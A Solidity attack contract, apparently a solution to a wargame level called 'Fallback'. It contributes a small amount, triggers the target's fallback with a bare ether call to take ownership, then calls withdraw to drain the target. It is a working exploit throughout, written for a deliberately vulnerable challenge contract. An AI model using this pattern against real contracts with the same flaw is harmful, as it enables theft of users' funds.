// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback{
    function getContribution() external view returns (uint);
    function contribute() external payable;
    function withdraw()  external payable;
    fallback() external payable;
}

contract AttackFallback1{
    IFallback public iFallback;

    constructor(address payable fallbackaddress){
        iFallback = IFallback(fallbackaddress);
    }

    function attack1() payable public{
        iFallback.contribute{value:msg.value}();
    }

    function attack2() payable public returns(bool){
        (bool sucess,) = address(iFallback).call{value:msg.value}(abi.encodeWithSignature(""));
        return sucess; 
    }

    function getContri() public view returns(uint){
        return iFallback.getContribution();
    }

    function withdraw() public{
         iFallback.withdraw();
    }

    receive() external payable {
    }
}

